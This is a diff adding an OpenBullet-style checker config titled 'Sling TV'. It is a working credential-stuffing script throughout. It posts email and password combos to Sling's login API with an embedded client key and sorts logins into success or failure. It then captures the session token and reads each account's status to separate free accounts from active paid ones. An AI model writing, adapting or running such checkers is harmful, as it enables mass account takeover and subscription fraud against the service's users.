@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Sling TV",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-25T19:51:28.4683318-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://webapi-blu.p.sling.com/ums/v5/sessions?client_application=ottweb&format=json&locale=en" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-N9005 Build/NJH47F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Fingerprint: C-300AR1G|0A4499758365" 
+  HEADER "Client-Consumer-Key: x0JVBblC25ubvPGaeXbfh0QsWrySSCoAzRba6iv1" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Referer: https://www.sling.com/signin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email/password combination" 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+
+PARSE "<SOURCE>" LR "{\"token\":\"" "\"," -> VAR "TOKEN" 
+
+REQUEST GET "https://webapi-blu.p.sling.com/ums/v5/user?client_application=ottweb&format=json&locale=en&token=" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Jwt-Authorization: Bearer <TOKEN>" 
+  HEADER "X-Fingerprint: C-300US1G|001486058382" 
+  HEADER "Client-Consumer-Key: x0JVBblC25ubvPGaeXbfh0QsWrySSCoAzRba6iv1" 
+  HEADER "Origin: https://www.sling.com" 
+  HEADER "Referer: https://www.sling.com/signin" 
+
+PARSE "<SOURCE>" LR ",\"account_status\":\"" "\",\"retention" -> CAP "STATUS" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain ",\"account_status\":\"active\",\"" 
+  KEYCHAIN Retry OR 
+    KEY "Your session has timed out. Please log in again" 
+
